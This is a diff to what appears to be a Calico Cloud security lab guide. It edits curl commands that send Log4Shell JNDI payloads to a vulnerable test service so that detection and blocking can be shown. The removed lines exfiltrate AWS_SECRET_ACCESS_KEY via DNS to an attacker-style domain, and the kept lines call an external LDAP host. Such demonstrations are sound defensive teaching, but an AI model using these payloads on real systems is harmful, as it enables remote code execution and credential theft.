@@ -96,10 +96,10 @@ kubectl get pods -n tigera-dpi
 kubectl exec -n dev -it multitool -- bash
 ```
 
-- Replace `SRV_IP` with the IP addreess of `vr-dev` service that you got from step #1, then run the query.
+- Run the malicious query that will leverage JNDI lookup method and connects to the attacker C&C server.
 
 ```
-curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.${env:AWS_SECRET_ACCESS_KEY}.evildoer.xyz}' 'vr-dev.dev/$\{jndi:ldap://185.220.101.56:443/a\}'
+curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.evildoer.xyz}' 'vr-dev.dev/$\{jndi:ldap://185.220.101.56:443/a\}'
 ```
 
 4- This time, you should get an alert in Calico Cloud’s UI. Check the alert in the `Service Graph` or `Alerts` page.
@@ -168,10 +168,10 @@ EOF
 kubectl exec -n dev -it multitool -- bash
 ```
 
-- Replace `SRV_IP` with the IP addreess of `vr-dev` service that you got from step #1, then run the query.
+- Run the malicious query that will leverage JNDI lookup method and connects to the attacker C&C server.
 
 ```
-curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.${env:AWS_SECRET_ACCESS_KEY}.evildoer.xyz}' 'vr-dev.dev/$\{jndi:ldap://185.220.101.56:443/a\}'
+curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.evildoer.xyz}' 'vr-dev.dev/$\{jndi:ldap://185.220.101.56:443/a\}'
 ```
 
 Now you notice that traffic is blocked because the C&C server IP is a malicious IP.
@@ -208,7 +208,7 @@ kubectl annotate svc vr-dev -n dev projectcalico.org/l7-logging=true
 kubectl exec -n dev -it multitool -- bash
 ```
 
-- Replace `SRV_IP` with the IP addreess of `vr-dev` service that you got from step #1, then run the query.
+- Run the malicious query that will leverage JNDI lookup method and connects to the attacker C&C server.
 
 ```
 curl -v -H 'User-Agent: ${jndi:dns://${SRV_IP.evildoer.xyz}' 'vr-dev.dev/$\{jndi:ldap://185.220.101.56:443/a\}'
